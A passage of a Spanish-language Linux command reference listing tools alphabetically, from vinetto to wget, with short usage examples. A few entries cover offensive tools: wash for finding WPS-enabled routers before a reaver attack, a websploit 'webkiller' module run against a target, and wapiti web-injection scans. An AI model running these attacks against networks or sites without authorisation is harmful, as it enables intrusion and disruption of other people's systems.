Aquí hay algunos ejemplos de cómo usar el comando vinetto :
$ vinetto archivo_thumbs.db (forma básica)
$ vinetto -o vinetto_output /dir_thumbs.db/* (extraer miniaturas de un dir y guardarlas en el dir vinetto_output)
$ vinetto -Ho vinetto_output /dir_tThumbs.db/* (extraer miniaturas en el dir vinetto_output y producir un informe html para previsualizarlas en el navegador)


vipe
[moreutils]. Permite editar en medio de una tubería los datos que están siendo canalizadas entre programas.
$ ls | vipe | ifdata -pb eth0


vipw
Editor que permite modificar el fichero /etc/passwd en modo seguro. La diferencia de editarlo con vipw o hacerlo con cualquier otro editor (gedit, nano...) es que vipw bloquea el fichero para evitar ediciones simultaneas y en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis.
# vipw (Edita el fichero /etc/passwd)
# vipw -s (Editar el fichero /etc/shadow)


virtualbox
[vitualbox-guest-utils linux-headers-$(uname -r) build-essential dkms]. Herramienta que permite la virtualización de sistemas operativos.
En la página https://www.virtualbox.org/wiki/Downloads apartado "VirtualBox 4.2 Oracle VM VirtualBox Extension Pack" clicar en "All platforms" y Descargar el paquete de extensiones Oracle_VM_VirtualBox_Extension_Pack-4.2.0-80737.vbox-extpack. Para instalarlo, doble clic en el paquete y seguir instrucciones [aceptar condiciones y contraseña de root].
# usermod -aG vboxusers USUARIO (Agregar usuario al grupo vboxusers)
# gpasswd -a $USER vboxsf (Agregar usuario al grupo vboxsf)
# modprobe vboxdrv (Activar módulo)
$ VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-4.2.16-86992.vbox-extpack (instala un pack de extensiones)
$ VBoxManage list extpacks  (Ver paquetes de expansión instalados)
1.-
Gestión de máquina virtuales desde consola:
Para la gestión de máquinas virtuales sin interfaz gráfica, se utiliza VboxHeadless para tal proposito que incluye diferentes comandos que veremos en las próximas líneas.
$ VBoxManage createvm --name "maquina_virtual" --register (Creamos una máquina virtual con el nombre "maquina_virtual")
$ VBoxManage modifyvm "maquina_virtual" --memory 780 --acpi on --boot1 dvd --nic1 bridged --bridgeadapter1 eth0 --ostype Ubuntu (Modificamos la máquina virtual que hemos creado, asignándole 780MB de RAM, activando ACPI, definiendo que arranque desde CD/DVD, indicando que la tarjeta de red sea en modo bridge y que el la tarjeta de red del sistema a usar es la eth0, y finalmente definiendo que la máquina será un Ubuntu.)
$ VBoxManage createvdi --filename ~/VirtualBox\VMs/maquina_virtual/maquina_virtual-disk01.vdi --size 30000 (Creamos un disco duro en formato VDI de 30 GB)
$ VBoxManage modifyhd maquina_virtual-disk01.vdi --resize 60000 (Redimensionar el espacio del fichero VDI en MB)
$ VBoxManage storagectl "maquina_virtual" --name "IDE Controller" --add ide (Añadimos un controlador IDE para posteriormente conectar el disco duro)
$ VBoxManage storageattach "maquina_virtual" --storagectl "IDE Controller" --port 0 --device 0 --type hdd --medium ~/VirtualBox\VMs/maquina_virtual/maquina_virtual-disk01.vdi (Asignamos el disco duro a la máquina virtual)
$ VBoxManage storageattach "maquina_virtual" --storagectl "IDE Controller" --port 1 --device 0 --type dvddrive --medium ~/IS
O/ubuntu-12.04.2-server-i386.iso (Asignamos a la máquina Virtual una ISO de instalación, en este caso de Ubuntu Server)
$ VBoxManage modifyvm "maquina_virtual" --pae on (activamos PAE en la máquina Virtual)
$ VBoxManage modifyvm "maquina_virtual" --memory 512 (Modificamos la RAM a 512MB)
$ VBoxHeadless --startvm "maquina_virtual" (arranca una máquina virtual)
$ VBoxHeadless --startvm "maquina_virtual" -e "TCP/Ports=7000" & (Arrancamos la máquina virtual indicando que queremos un servidor RDP para conexión remota en el puerto 7000)
$ VBoxManage controlvm "maquina_virtual" poweroff (Para la máquina virtual. Recomendable parar primero la máquina virtual desde la maquina virtual y luego ejecutar esto)
$ VBoxManage clonehd Metasploitable.vmdk ../Metasploitable2-Linux.vdi -format VDI (Convertir una imagen vmdk en vdi)


virtualenv
Crea contenedores para Python. Similar al concepto de Docker para hacer la aplicación instalada dentro del contenedor independiente de las versiones de Python del sistema.
$ virtualenv nombre_contenedor (Crea el contenedor)


virt-what
Script de shell que detecta si un programa se está ejecutando en una máquina virtual (VM).
$ virt-what


visitors
Muestra estadisticas del sitio web local.
# visitors -A /var/log/apache2/access.log -o html > report (Activar todas las opciones [-A] que guarde la salida en formato html [-o] y que base el informe en el archivo /var/log/apache2/access.log)


visudo
Editor que permite modificar el fichero /etc/sudoers en modo seguro. La diferencia de editarlo con visudo o hacerlo con cualquier otro editor (gedit, nano...) es que visudo bloquea el fichero para evitar ediciones simultaneas y en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis.
# visudo (Edita el fichero /etc/sudoers)
# visudo -c (Chequea si existen errores en /etc/sudoers)
# visudo -f archivo (Especificando un archivo alternativo al por defecto de /etc/sudoers)


vlc
Reproductor de video y audio
$ vlc -I  (listar opciones. La opción es “i” mayúscula)
$ vlc -l | grep -i interface  (ver solo las interfaces)
$ vlc -I ncurses (arrancar en modo ncurses)
$ vlc -I ncurses cdda://sr0/ (lo mismo indicando dispositivo del CD)


vlock
Bloquea la terminal actual local o remota o bloquea todo el sistema de consola virtual, deshabilitando completamente todo el acceso a la consola. vlock cancela estos bloqueos cuando se escribe la contraseña del usuario que inició vlock o la contraseña de root. vlock es interesante en entornos de sistemas de múltiples usuarios permitiendo a unos usuarios bloquear sus sesiones mientras que otros pueden usar el mismo sistema a través de otro terminal virtual.
$ vlock (bloquear una sesión de consola)
$ vlock -c (bloquear la consola de la sesión actual [default])
$ vlock -a (bloquear todas las consolas. Si se está en una virtual bloquea todas las virtuales)
# vlock -n (bloquea todas la consolas de X)
# vlock -s (deshabilitar vlock)
Para desbloquearla, pulsar “enter” y la contraseña del usuario que la ha bloqueado.


vmkfstools
Modificar por duplicidad [msg.disk.duplicateUUID:Virtual disks] o asignar por ausencia [disk does not have a UUID] un nuevo UUID a un disco VMDK.
# vmkfstools -J getuuid virtual01.vmdk (Asignar nuevo UUID)
# vmkfstools -J setuuid virtual01.vmdk (Modificar el UUID)


vmstat
Herramienta de monitorización del rendimiento. Proporciona información acerca de procesos, actividad de la CPU, memoria, paginación, bloques de entrada salida e interrupciones.
# vmstat 2  (actualización cada dos segundo)


vmtouch
Herramienta para controlar la memoria caché del sistema.
$ vmtouch /bin/ (cantidad del directorio /bin que está es caché)
$ vmtouch -vt archivo.txt (cuanto del archivo especificado está en memoria caché y mostrando progreso)
$ vmtouch -ve video.mp4 (desalojar video.mp4 de la memoria caché)
$ vmtouch -dl /vat/log/ (Daemoniza y bloquea todos los archivos de un directorio en la memoria física)


vncrec
[xutils-dev libxt-dev libxmu-dev libxaw7-dev]. Grabación de sesiones vnc. (https://wiki.ubuntu.com/ScreenCasts/VNCREC)
$ wget http://ronja.twibright.com/utils/vncrec-twibright.tgz
$ tar xzvf vncrec-twibright.tgz
$ cd vncrec-twibright/
$ xmkmf
$ make World
# cp -R vncrec-0.2 /usr/local/
# ln -s /usr/local/vncrec-0.2/vncrec/vncrec-twibright/vncrec/vncrec /usr/bin/vncrec
$ vncrec -record archivo IP_o_host:1  (iniciar conexión y grabación)
$ vncrec -play archivo   (reproducir la grabación)
$ vncrec -movie archivo | ffmpeg2theora --no-audio -o archivo.ogv – (convertir la grabación a formato ogv)


vncserver
Permitir acceso remoto
$ vncserver :1   (arrancar el servicio con el número de sesión 1)
$ vncpasswd   (Entrar una contraseña)
$ vncserver -kill :1   (Matar la sesión 1)
Conectarse desde el cliente:
$ vncviewer IP_o_host:1


vncviewer
Conexión remota
$ vncviewer host  (básica)
$ vncviewer host -bgr233 (Para conexiones lentas. Reduce la calidad del color)
$ vncviewer host -geometry 800x600 (Para conexiones lentas. Reduce la ventana)
$ vncviewer host -quality 0 (disminuir la calidad de la imagen y aumentar la compresión. El valor va de 0 a 9 siendo el 9 máxima calidad de imagen y menor compresión)


vnstat
Herramienta que guarda un registro del tráfico de nuestras conexiones de red seleccionadas. Sobre este registro realiza estadisticas de uso. Tambien permite mostrar estos registros en distintos formatos: datos del día, de la semana, el total descargado y un top10 con los días de mayor uso de ancho de banda.
# vnstat -u -i eth0 (crear la base de datos)
# vnstat -d -i eth0  (consultar informes por días [-h -> horas, -m -> meses])
# vnstat -i eth0
# vnstat -l -i eth0  (monitorizar en tiempo real hasta pararlo con Ctrl+c Al finalizar mostrará un resumen del periodo monitorizado)
# vnstat -tr  (por un periodo de 5 segundos)


vnstati
[vnstat]. Crea un png de la salida del comando vnstat.
$ vnstati -s -vs -i eth1 -o vnstat.png (Mostrando resumen del tráfico de salida [s], incluyendo datos por hora en gráfica vertical [vs], especificando la red y guardando en vnstat.png [o])
$ vnstati -h -c 15 -o vnstat2.png (por horas [h] y actualizando si han pasado 15 minutos del último reporte)


vobcopy
Ripear dvds.
$ vobcopy -i /dev/dvdrom -o /home/usuario/musica


vol_id
Mostrar tipo de fichero y uuid de una partición
# vol_id --export /dev/sda2
# vol_id --uuid /dev/sda2  (solo muestra el uuid)


vramsteg
Proporciona una barra de progreso que puede mostrar el tiempo transcurrido, el tiempo restante estimado, el porcentaje completado y las etiquetas.
ejemplo en un script:
$ nano vramsteg.sh
	#! /bin/bash
	for i in {0..10}
	do
         vramsteg --min 0 --max 10 --style text --current $i
	 sleep 1
	done
	echo
        vramsteg -r
Nota.- style puede ser "mono" [progreso en color blanco] o "text" [progreso con asteriscos] si no se especifica es en color [default]. -r es borrar la barra de progreso.


vrms
Para saber los paquetes contrib y non-free instalados y su porcentaje en el sistema en Debian.
$ vrms


vsftpd
Servidor de archivos ftp. Toda la configuración de encuentra en el archivo:
# nano /etc/vsftpd.conf
Algunos de los parámetros:
	anonymous_enable=NO (si no queremos accesos anonimos)
	local_enable=YES (Permitir accesos locales autentificados)
	write_enable=YES  (Permite escritura en el servidor)
	ftpd_banner=Entrando en el servidor ftp...
	chroot_local_user=YES (Enjaular la conexión a su propio directorio personal)
	max_clients=5  (limitar a 5 los accesos simultaneos)
	Nota.- Han de redigirirse los puertos 20 y 21 y el rango especificado en el archivo de configuración:
	pasv_min_port=44000
	pasv_max_port=44100
El cliente podrá conectarse al servidor via filezilla, gftp...


vtclock
Reloj digital.
$ vtclock -2 -d 1 (Usando la fuente 2 [de 1 a 5] y desplazandose por la terminal cada segundo)


vte
Terminal
$ vte -T (Lanza terminal semitransparente)
$ vte -g 60x10 -r red (Especificando medidas y color del cursor)


vtmc
Realiza una presentación de alta calidad. Descarga: <https://github.com/jclulow/vtmc>
$ vtmc show DIR (mostrar las diapositicas del directorio DIR)
Opciones:
     j (diapositiva siguiente)
     k (diapositiva anterior)
     r (recargar la presente diapositiva)
     q (salir)


vtprint
Permite imprimir desde un host UNIX remoto a una impresora conectada a una terminal local solo archivos de texto y puede sustituir a lpr [ver]) en circunstancias en las que la impresora no está conectada directamente al host o no está disponible a través de TCP/IP. Incluye: vtprtoff (desactiva la redirección de texto ASCII a la impresora conectada a una terminal) y vtprton (la activa)
$ vtprint nota.txt


vttest
Proporciona un programa diseñado para probar la funcionalidad del terminal VT100 [o emulador]. También es compatible con el análisis de VT220, VT420 y xterm. Cuando se entra en el prompt del programa, se observa el menú y contiene instrucciones de funcionamiento en línea. Prueba tanto la visualización [secuencia de escape] como el manejo del teclado.
$ vttest (entrar en el prompt)


vuls
Escáner de vulnerabilidades. Automatiza el análisis de vulnerabilidad de seguridad del software instalado en un sistema. Utiliza múltiples bases de datos de vulnerabilidades de renombre, como la National Vulnerability Database (NVD). Crear en el directorio personal el archivo::
$ nano config.toml
Con, como mínimo, el siguiente contenido:
	[servers]
	[servers.localhost]
	host = "localhost"
	port = "local"
$ vuls commands (listado de comandos que pueden usarse)
$ vuls configtest (realizar un test)
$ vuls scan (realizar el escaneo de lo especificado en config.toml)
$ vuls report (ver el informe)
$ vuls tui (analizar vulnerabilidades)


vzrestore
Restaurar maquinas virtuales [ver vzdump]


vzdump
Realizar copias de seguridad y restaurar imágenes openvz. Vzdump es un programa de respaldo basado en shell para máquinas virtuales OpenVZ. Está hecho para contenedores que usan el sistema de archivos tradicional "simfs", no se puede usar para contenedores con sistema de archivos "ploop".
# vzdump --compress --dumpdir /home/USER/backup 101 (crear copia de seguridad de la máquina virtual [contenedor] comprimida, en el dir especificado y con el ID 101)
# vzdump --compress --dumpdir /home/USER/backup --all (crear copia de seguridad de todos los contenedores)
# vzrestore /home/USER/backup/vzdump-101.tgz 104 (restaurar la máquina virtual 101 desde la copia de seguridad con la nueva ID 104)


w
Ver que estan haciendo los usuarios conectados (ESER) y desde qué teminal (TTY) y equipo remoto (FROM), el tiempo que hace que no está realizando ninguna acción (IDLE), el tiempo utilizado por todos los procesos conectados al terminal (JCPU) y el utilizado por el proceso actual (PCPU) y el útimo comando ejecutado (WHAT). El comando interpreta la información del fichero /var/run/utmp.
# w


w3m
Navegador
$ w3m -v URL (Para visualizar las url con imágenes en las tty)
Algunos atajos:
    H (ayuda)
    q (Salir)
    Q (Salir sin preguntar)
    Espacio (Desplazamiento por paginas)
    g (Ir a la parte superior)
    G (Ir a la parte inferior)
    Tab (Ir al siguiente enlace)
    Alt + Tab (Ir al enlace anterior)
    B (Ir a la página anterior)
    u (Muestra la URL)
    U (Abre cuadro de dialogo para entrar nueva URL)
    / (Buscar hacia delante una palabra)
    ? (Buscar hacia atras una palabra)
    v (Alterna entre vista normal y codigo fuente)
    R (Recargar	la página)
    s (Abrir historial reciente)


wajig
Herramienta que engloba apt, apt-cache, dpkg, aptitude, apt-get y otros.
# wajig list-commands
	daily-upgrade (Ejecuta «update», después «dist-upgrade»)
	install (Instala un paquete)
	installrs (Instala un paquete y los que este sugiere y recomienda)
	auto-download (Ejecuta «update» y se descarga todos los paquetes actualizados)
	available (Muestra las versiones del paquete disponibles para su instalación)
	bug (Revisar los informes de error usando Debian Bug Tracker)
	detail (Ofrece una detallada descripción del paquete)
	file-find (Busca un archivo contenido en un paquete instalado)
	find-pkg (Busca un paquete Debian no oficial en apt-get.org)
	hold (Retiene los paquetes para evitar que se actualicen)
	last-update (Identifica el momento en que se realizo la última actualización)
	list-hold (Muestra los paquetes retenidos)
	new (Muestra los paquetes disponibles desde la última actualización)
	news (Obtiene las últimas noticias relativas al paquete)
	orphans (Muestra las bibliotecas que ningún paquete requiere)
	package (Generaa un archivo .deb de un archivo instalado)
	purge-depend (Purga paquete y aquellos que de el dependen, o que otros no requieren)
	readme (Muestra el archivo README de «/usr/share/doc»)
	restart (Detiene y reinicia un demonio, [wajig restart ssh])
	rpminstall (Instala un paquete .rpm de RedHat)
	search-apt (Busca archivos de Debian apropiados para sources.list)
	showinstall (Muestra los pasos que tomará una instalación)
	status (Muestra la versión y versiones disponibles de un paquete)
	toupgrade (Muestra paquetes susceptibles de ser actualizados)
# wajig install xclip
# wajig auto-download (eqivalente al apt update)
# wajig toupgrade (equivalente al apt upgrade)


wait
Indica el estado de un proceso que se está ejecutando o se ha ejecutado en background o espera a que se realice determinado proceso o trabajo para continuar.
$ wait
$ wait PID  (Indicando el PID)
$ wait %2  (Indicando el número de proceso)


wait-for-it
Script de bash que esperará la disponibilidad de un host y un puerto TCP.
$ wait-for-it www.google.com:80 --echo "google está activo"
$ wait-for-it -t 1 www.google.com:80 --echo "google está activo" (activo después de 1 segundo)


wall
Enviar mensajes a todas las terminales
$ wall (al darle al enter, podrá escribirse un texto. Una vez finalizado se le da otra vez al enter y se pulsa Ctrl+d para enviarlo a todas las terminales, incluidas las tty abiertas)
$ wall [intro]
No quiero morir!!!!!!!!!!!! [intro]
[Ctrl+d]
Broadcast Message from lb@tux
    (/dev/pts/9) at 17:39 ...
No quiero morir!!!!!!!!!!!!
$ wall << finmensaje (lo mismo pero lo envia al introducir “finmensaje”)


wallstreet
Esta utilidad dividirá la consola en múltiples paneles de noticias y estadísticas como cualquier buena pantalla de computadora en Wall Street. Finalizar la aplicación pulsando C-c
$ wallstreet


wapiti
Permite auditar la seguridad de aplicaciones web. Realiza escaneos "black-box", es decir, no estudia el código fuente de la aplicación, pero escaneará las páginas web de las aplicaciones web desplegadas, buscando secuencias de comandos y formularios donde pueda inyectar datos. Una vez que obtiene esta lista, wapiti actúa como un fuzzer, inyectando cargas útiles para ver si un script es vulnerable.
$ wapiti --list-modules (listar modulos)
$ wapiti -u http://site.com/ -m sql --color (resaltar parámetros vulnerables [--color] y especificando un módulo [m])
$ wapiti -u http://site.com -m "-all,xss:get,exec:post" -v 1 (especificando varios módulos y nivel verbose 1 [imprimir cada url])
$ wapiti -u http://site.com -n 10 -b folder -v 2 -f html -o informe (limite de urls para leer [10] con el mismo patrón [evitar bucles interminables] y destino [o])
Nota.- el parámetro "v" puede ser: 0: quiet (default), 1: imprimir cada url y 2: imprimir cada ataque. El formato "f" puede ser txt, xml o json. El parámetro "b" puede ser "page": analizar sólo la página dada como URL raíz, "folder": analizar todos los URLs bajo la URL raíz [por defecto] y "domain": analizar todos los enlaces a las páginas que están en el mismo dominio que el URL pasada.


wapua
Navegador que muestra el código WML de la páginas visitadas.
$ wapua lapipaplena.org


wash
Detectar routers wifi con el WPS Pin activado. Sólo muestra las que sean compatibles con WPS. En el apartado "WPS Locked" debe constar "No". Luego proceder con el ataque con reaver (ver)
# wash -i mon0


watch
permite ejecutar repetidamente una sentencia u otro comando
$ watch -n 5 date (mostrará la fecha cada cinco segundos)
$ watch -tn1 'date +%r | figlet' (muestra la hora en un digital en consola)
$ watch -tn1 'date "+%r %F %A"'  (Muestra la fecha completa)
$ watch -n3 free -m (monitor de ram)


watchcatd
Daemon que monitoriza los procesos registrados, matándolos en caso de que se bloqueen. El archivo de configuración está en /etc/watchcatd.conf


watchdog
Es un daemon que escribe en /dev/watchdog cada diez segundos. Si el dispositivo se abre pero no se escribe en un minuto, la máquina se reiniciará. Esta característica está disponible cuando el kernel está construido con soporte de "watchdog de software" (estándar en los núcleos Debian) o si la máquina está equipada con hardware watchdog. La capacidad de reiniciar del software del kernel dependerá de estado de la máquina. La herramienta en sí misma ejecuta varias comprobaciones y actúa de manera adecuada si el sistema no está en buen estado.


watchgnupg
Escuchar un socket de dominio Unix creado por cualquiera de las herramientas GnuPG
$ watchgnupg --force (Elimina un archivo de socket ya existente. Esta opción se utiliza si no se ha dado ningún nombre de socket en la línea de comandos)
$ watchgnupg --homedir DIR (si no se da un nombre de socket, pase DIR a gpgconf para que se use el socket de un GnuPG que se esté ejecutando en suu directorio home)
$ watchgnupg --tcp n (En lugar de leer de un socket local, escucha conexiones en el puerto TCP n. Opcionalmente, también se puede dar un socket de dominio Unix como segunda fuente)
$ watchgnupg --time-only SOCKET (No imprima la parte de la fecha de la marca de tiempo)
$ watchgnupg --verbose SOCKET (Activar la salida de información adicional.)


watchman
Herramienta para observar archivos o directorios y registrar cuándo cambian realmente. Existe una amplia información en <http://facebook.github.io/watchman/docs/install>
$ watchman watch-project /home/user/docs (raíz lógica de un conjunto de archivos relacionados en el que consolidar las vigilancias)
Nota- Es preferible usar la opción "watch-project" a la "watch" que está desactualizada
$ watchman watch-list (muestra listado de registros)
$ watchman log debug "esto es una nota" (genera una línea de registro en el registro de watchman)
$ watchman find ~/docs/ notas.txt (busca los archivos que coinciden con el patrón "nota.txt" en el directorio especificado)
$ watchman watch-del ~/docs (elimina un reloj y cualquier disparador asociado)
$ watchman watch-del-all (elimina todos los relojes y activadores asociados)


watson
Controlar los tiempos que se dedican a un proyecto.
	$ watson start proyecto1 (iniciar el control del proyecto1)
	Starting project proyecto1 at 08:15
Lista de algunos comandos útiles:
	cancel - Cancelar la última llamada al comando de inicio. El tiempo no será registrado.
	frames - Mostrar la lista de todos los frames.
	log - Mostrar cada sesión grabada durante el período de tiempo determinado.
	projects - Lista todos los proyectos existentes.
	remove - Eliminar un frame.
	rename - Cambiar el nombre de un proyecto o etiqueta.
	report - Informe del tiempo dedicado a cada proyecto.
	restart - Reiniciar tiempo de monitoreo para un proyecto previamente detenido.
	status - Muestra cuándo se inició el proyecto actual y el tiempo transcurrido desde entonces.
	stop - Dejar de monitorear el tiempo para el proyecto actual.
	tags - Mostrar lista de todas las etiquetas.


wavemon
Permite observar los niveles de señal y ruido, paquetes estadísticas, configuración del dispositivo y parámetros de red de su hardware de red inalámbrica.
$ wavemon (abre el monitoreo)


wc
Cuenta caracteres, lineas, palabras...
$ wc /etc/hosts /etc/fstab (Muestra lineas, palabras y caracteres de los dos archivos)
$ wc -c /etc/fstab (bytes)
opciones:
-l (cantidad de líneas)
-w (cantidad de palabras)
-m (total de caracteres.)
-L (la longitud de la línea más larga del texto)


wcatalan
Paquete que proporciona el fichero /usr/share/dict/catala que contiene una lista alfabética de palabras catalanas.


wdctl
[util-linux]. Muestra el estado de la vigilancia del hardware. El dispositivo predeterminado es /dev/watchdog
# wdctl -F (no imprime información sobre flags)
# wdctl -r (formato de salida sin formato para la tabla de flags)
# wdctl -I (información de identidad del organismo de control y tabla de flags)
# wdctl -O (información en una sola linea)


wcd
Programa para cambiar de directorios rápidamente. Solo se precisa escribir una parte de un nombre de directorio y wcd saltarán a él. De manera predeterminada, wcd busca un directorio con un nombre que comienza con lo que se ha escrito. El uso de comodines también es totalmente compatible.


wdel
[wput]. Pequeño cliente ftp, que carga archivos o directorios a un servidor ftp remoto. Las caracteristicas principales son: reanudación, sellado de tiempo, interfaz tipo wget, proxy-soporte y límite de velocidad.


wdiff
Compara dos archivos, encontrando qué palabras se han eliminado o agregado al primero para crear el segundo. wdiff es particularmente útil cuando dos textos difieren solo por unas pocas palabras y se han rellenado párrafos.
$ wdiff texto.txt texto2.txt (forma básica)
$ wdiff -3 texto.txt texto2.txt (sólo mostrando la diferencias)


weather
[weather-util]. Estado del tiempo. Buscar el código de la ciudad en:
http://www.nws.noaa.gov/tg/siteloc.shtml
$ weather -m -v LEGE  (En decimal con la maxima información y para Gerona [España])


web2disk
Herramienta que permite descargar un sitio web, incluyendo imágenes, hojas de estilo y otros contenidos incrustados,  para navegar sin conexión.
$ web2disk URL


webalizer
Genera reportes en formato html de los accesos a una página web instalada en la misma máquina.
Configuración mínima:
# nano /etc/webalizer/webalizer.conf
Verificando que el siguiente contenido esté descomentado:
	LogFile         /var/log/apache2/access.log
	OutputDir       /var/www/webalizer
	Incremental     yes
	ReportTitle     Estidísticas de PAGINAWEB_NOMBRE
	Hostname URL_PAGINA
	IgnoreSite      localhost
Especificamos los logs a analizar [logfile], el directorio de salida de los resultados [outputdir], que analice todo por separado [incremental], título de la página de reporte [reporttitle], nombre de la página a analizar [hostname] y que innore los accesos desde la propia máquina [ignoresite]
# webalizer -c /etc/webalizer.conf -d (que se base en el archivo especificado [-c] y que haga debugging de los reportes por si todo salió sin errores [-d])
Dado que los reportes solo se realizan cuando se ejecuta el comando, es preferible colocar la linea en crontab:
$ crontab -e
Y añadir:
	0 0 * * * /usr/bin/webalizer -c /etc/webalizer.conf -d


webcheck
Revisa una URL, siguiendo sus enlaces y genera un informe index.html en el presente directorio.
# webcheck URL


webdruid
Programa de análisis de archivos de registro de sitios web que produce estadísticas detalladas de visitas a sitios basadas en los registros de servidores como Apache o Nginx y en formato HTML para ver con un navegador. Contiene la aplicacion webdruid-resolve.
# webdruid /var/log/apache2/access.log (generar estadísticas sobre un archivo de logs web)
# webdruid -n www.mi_sitio_web.com -o /var/www/html/weblogs/ /var/log/apache2/access.log (-n: nombre del host que aparecerá en los informes y -o: directorio de salida donde se guardarán los informes)
Configuración básica:
# nano /etc/webdruid/webdruid.conf.
con el contenido:
    LogFile /var/log/apache2/access.log    # Archivo de log a analizar
    LogType clf                            # Tipo de log (clf para "Common Log Format" formato común de Apache)
    OutputDir /var/www/html/weblogs/       # Directorio de salida para los informes HTML
    HostName www.mi_sitio_web.com          # Nombre del sitio para los informes
    Incremental yes                        # Habilita el modo incremental (procesa solo los nuevos logs)
# webdruid -c /var/log/apache2/access.log (analizar solo las nuevas líneas que se agregan al archivo de logs)
Los informes en el ejemplo expuesto se abren con el navegador en la ruta /var/www/html/weblogs/index.html
1- Se puede usar com cron, por ejemplo, para que resalice un informe cada dia a las 00:00 horas
   0 0 * * * /usr/bin/webdruid -c /var/log/apache2/access.log


webfsd
Sencillo servidor HTTP para contenido estático. Carece de archivos de configuración por lo que todas sus funcionalidades se pueden controlar por parámetro. Acceso por navegador con http://url_o_ip:puerto.
$ webfsd -r /home/usuario/videos -p 12001 (Compartir el directorio "videos" por el puerto 12001 y actuando como demonio. Matar el proceso con killall webfsd)
$ webfsd -F -r /home/usuario/videos -p 12001 -b pepe:1234 (Solicitando nombre de usuario y contraseña y sin actuar como demonio [-F]. Matar el proceso con Ctrl+c)


webkit2pdf
Descargar la portada de una página web y pasarla a pdf.
$ webkit2pdf -f test.%02d.pdf -o web http://lapipaplena.net (Que la descargue y la guarde [f] en formato "test.00.pdf" y en el directorio web [o])


webood
[mplayer python-weboob-core] Colección de aplicaciones capaces de interactuar con los sitios web sin necesidad de que el usuario abra un navegador. Varias de las aplicaciones que lo integran son especificas para usuarios franceses. En el tractatus se han desarrolado sólo (Ver): geolooc (geolocalizar direcciones IP), videoob (búsqueda de vídeo), weboorrents (búsqueda de torrents) y wetboobs (pronóstico del tiempo). La instalación a partir de los repositorios (Debian) producía ciertos errores en la salida de algunos comandos. La solución pasa por descargar el zip de github:
	$ wget https://github.com/frankrousseau/weboob/archive/master.zip
	$ unzip master.zip
	$ cd weboob-master
	# python setup.py install
$ weboob-config update (Actualizar)
$ weboob-config disable geolocip (Desactivar un módulo. Este concretamente da errores. "enable" para activarlo)
$ weboob-config list (Listar los módulos)
$ weboob-config add youporn (Añadir un módulo)
$ weboob-config info btmon (Información sobre un módulo)


weboorrents
[webood (Ver)]. Descarga de torrents.
$ weboorrents (Entrar en el prompt)
weboorrents> search kali (Mostrar salida para "kali")
weboorrents> info 7 (Informaciónj sobre la salida "7" dels listado anterior)
weboorrents> getfile 7 (descargar el torrent o magnet "7")
weboorrents> quit (Salir del prompt)


webp
Reduce la medida de imagenes jpeg y png. Es una herramienta de google que, de momento [2013] el formato webp sólo es compatible con algunos navegadores [chromium y Opera] pero puede usarse para comprimir una imagen para acto seguido descomprimirla de nuevo: La reducción de peso es considerable.
$ cwebp -q 60 entrada.png -o salida.webp (Compresión al 70 %. Por defecto 75)
$ dwebp entrada.webp -o salida.png (Descompresión)


webpng
Información de imágenes .png
$ webpng -d imagen.png (medidas y otras caracteristicas)
$ webpng -l imagen.png (tabla de colores indexados)


websploit
Explotación de vulnerabilidades y ataques en red. Contiene varios módulos divididos en: web, red, explotación y wifi. Descarga: http://sourceforge.net/projects/websploit/
Uso básico:
# websploit (Lanzar la aplicación y entrar en el prompt)
wsf > show modules (Ver los mudulos disponibles)
wsf > use network/webkiller (Escoger el módulo que se va a usar)
wsf > show options (Ver los parámetros que han de entrarse)
wsf > set target http://192.168.1.10 (Entrar el/los parámetros que solicite "show options")
wsf > run (Iniciar el ataque)
Otros comandos:
wsf > os ip a (Lanzar un comando externo, "ip a" en este caso)
wsf > update (Comprobar actualizaciones)
wsf > upgrade (Aplicar las actualizaciones)
wsf > back (Salir del módulo actual)
wsf > stop (Para el ataque o el scaneo)


weechat-curses
chat irc.
Comandos básicos (Comunes para aplicaciones relacionadas con chat irc):
	/connect irc.irc-hispano.org (Conectar con un servidor)
	/nick obama (Ponerse un alias)
	/list (Listado de las salas disponibles)
	/join #ubuntu (conectar con una sala)
	/part #ubuntu (Salir de una sala)
	/partall (Salir de todas las salas)
	/exit (Salir de IRC)
	/quit hasta la proxima (Salir dejando un mensaje)
	/whois nick (Información del usuario con el nick especificado)
	/who #canal (Muestra información sobre un canal)
	/query nick (Abrir una linea con una persona)
	/help (Muestra la ayuda)
	/me Linux es genial (Muestra el mensaje)
	/away Estoy durmiendo (Muestra que estamos ausentes)
	/notice Aquí estoy (Mandar un texto en forma de notificación)
	/ison nick (Indica si un nick está conectado)
	/ignore nick (Permite ignorar a un usuario)
	/send nick archivo (Permite enviar un archivo a un usuario)
	/log on/off (Activa o desactiva la grabación de la conversación actual)


wetboobs
[weboob (Ver)]. Previsión del tiempo. Precisa activar el módulo weather (Ver weboob).
$ wetboobs (Entra en el prompt)
wetboobs> cities girona (Muestra todas las opciones geograficas de "girona")
wetboobs> current 1 (Muestra la previsión para el dia actual de la opción 1 del listado anterior)
wetboobs> forecast 3 (Muestra la previsión de varios dias de la opción 1)
wetboobs> quit (Salir del prompt)


wget
Realizar descargas de una web. Soporta protocolo http, https y ftp.
$ wget http://www.ubuntu.org/ubuntu.iso  (descarga básica)
$ wget http://www.tuxapuntes.com (descargar página incial del sitio web)
$ wget http://www.ubuntu.org/ubuntu.iso ftp://www.debian.org/debian5.iso (varias descargas)
$ wget -i archivo.txt  (Realizar las descargas enumeradas en archivo.txt)
$ wget --limit-rate=60k ftp://ftp.ubuntu.org/hardy.iso (limitar ancho banda)
$ wget -p http://www.tuxapuntes.com (todos los elementos extras)
$ wget -c http://direccion_de_la_descarga.com (reiniciar descarga interrumpida)
$ wget --spider  --no-parent -r -o log.txt http://web.com (lista enlaces rotos)
$ wget -m -p -k -P DIR http://www.tuxapuntes.com (descargar todo un sitio recursivamente [-m], todo tipo de recursos, css, imágenes y demás para que se vea localmente [-p] y convierte los enlaces a accesibles de forma local [-k] y se guarde en el directorio "DIR")
$ wget --wait=20 --limit-rate=20K -r -p -U Mozilla http://url.com (lo mismo pero haciendo pausas entre páginas y simulando ser un navegador)
$ wget -O - -q http://checkip.dyndns.org/ | cut -d':' -f2 | cut -d'<' -f1| cut -c2- (Conocer la ip publica)
$ wget -O - -q http://whatismyip.org/ (Lo mismo)
$ wget –http-user=usuario –http-password=contraseña URL (Descargar con usuario y contraseña)
$ wget –ftp-user=usuario –ftp-password=contraseña URL (Lo mismo con protocolo ftp)
1.-
Muestra para la descarga de una web completa:
